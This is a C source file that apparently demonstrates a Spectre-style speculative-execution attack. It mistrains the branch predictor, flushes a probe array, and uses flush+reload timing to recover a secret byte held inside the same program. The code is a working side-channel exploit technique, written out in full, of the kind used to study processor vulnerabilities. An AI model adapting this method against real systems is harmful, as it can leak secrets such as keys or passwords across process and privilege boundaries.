/*
 * ooe.c
 * Exploit out-of-order execution to retrieve information on the 
 * basis of an operation that never actually happens at an architectural level. 
 *
 * Kyle Dotterrer
 * December, 2018 
 */

#include <stdio.h>
#include <emmintrin.h>
#include <x86intrin.h>

/* ----------------------------------------------------------------------------
	Constants
*/

#define NITERS 100

// array access below cycles assumed to be cache hit  
#define CACHE_HIT_THRESHOLD (80)  

#define ARRSIZE (256)
#define DELTA   (1024)  // offset on each array access 

/* ----------------------------------------------------------------------------
	Local Prototypes 
*/

void flush_side_channel  (void);
void reload_side_channel (void); 

void victim(size_t x);

/* ----------------------------------------------------------------------------
	Global Variables 
*/

uint8_t array[ARRSIZE*4096];

int temp;
int size = 10;

// set the secret value here 
char secret = 97;

/* ----------------------------------------------------------------------------
	Main
*/

int main(void) {
	// flush the probing array
	flush_side_channel();

	// mistrain the branch predictor
	for (int i = 0; i < NITERS; i++) {
		for (int j = 0; j < 10; j++) {
			_mm_clflush(&size);
			victim(j);
		}
	}


	// ensure size is flushed from cache
	// subsequent accesses may take some time...
	_mm_clflush(&size);

	// ensure array is flushed from cache 
	for (int i = 0; i < ARRSIZE; i++) {
		_mm_clflush(&array[i*4096 + DELTA]);
	}

	// exploit out of order execution? 
	victim(secret);

	// reload the probing array
	reload_side_channel();

	exit(0); 
}

/* ----------------------------------------------------------------------------
	Local Functions 
*/

void flush_side_channel(void) {
	// write to array to bring it to RAM
	// prevents copy on write 
	for (int i = 0; i < ARRSIZE; i++) 
		array[i*4096 + DELTA] = 1;

	// flush the entire array from cache 
	for (int i = 0; i < ARRSIZE; i++) 
		_mm_clflush(&array[i*4096 + DELTA]);
	
}

void reload_side_channel(void) {
	// where we store register contents
	// dont care about this 
	unsigned int junk = 0;

	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (int i = 0; i < ARRSIZE; i++) {
		addr = &array[i*4096 + DELTA];
		time1 = __rdtscp(&junk);
		junk = *addr; 
		time2 = __rdtscp(&junk) - time1;

		// large variable latency of access time due to caching 
		// allows us to determine (with high degree of certainty)
		// what the secret value used to access the array was 
		if (time2 <= CACHE_HIT_THRESHOLD) {
			printf("array[%d*4096 + %d] is in cache\n", i, DELTA);
			printf("the secret = %d\n", i);
		}
	}
}

void victim(size_t x) {
	// can we get this branch to execute speculatively? 
	// will (all) the microarchitectural state be unchanged?
	if (x < size) {
		// use secret to access the array 
		temp = array[secret*4096 + DELTA];
	}
}
